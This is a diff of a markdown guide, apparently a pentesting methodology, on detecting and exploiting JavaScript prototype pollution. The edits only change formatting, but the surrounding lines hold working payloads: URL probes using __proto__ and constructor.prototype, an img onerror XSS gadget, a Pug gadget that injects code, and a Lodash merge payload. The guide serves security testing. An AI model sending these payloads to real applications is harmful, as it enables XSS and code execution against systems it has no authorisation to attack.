@@ -20,7 +20,8 @@ Exploit JavaScript prototype pollution to modify Object.prototype, leading to XS
 ### Phase 1: Client-Side Detection
 
 **URL-based pollution:**
-```
+
+```text
 https://TARGET/?__proto__[polluted]=1
 https://TARGET/?__proto__.polluted=1
 https://TARGET/?constructor[prototype][polluted]=1
@@ -28,6 +29,7 @@ https://TARGET/#__proto__[polluted]=1
 ```
 
 Verify in browser console:
+
 ```javascript
 console.log(({}).polluted) // Should print "1" if vulnerable
 ```
@@ -86,11 +88,13 @@ Object.prototype['data-tooltip'] = '<img src=x onerror=alert(1)>'
 ### Phase 5: Framework-Specific
 
 **Express.js / Pug:**
+
 ```json
 {"__proto__": {"block": {"type": "Text", "val": "x]));process.exit()//"}}}
 ```
 
 **Lodash merge:**
+
 ```json
 {"__proto__": {"polluted": true}}
 ```
@@ -107,7 +111,7 @@ Object.prototype['data-tooltip'] = '<img src=x onerror=alert(1)>'
 ## Evidence Requirements
 
 - Endpoint accepting merge/deep-copy of user input
-- Payload sent (__proto__ or constructor.prototype)
+- Payload sent (`__proto__` or `constructor.prototype`)
 - Proof of pollution (new property on empty object)
 - For RCE: command output
 - For XSS: JavaScript execution proof
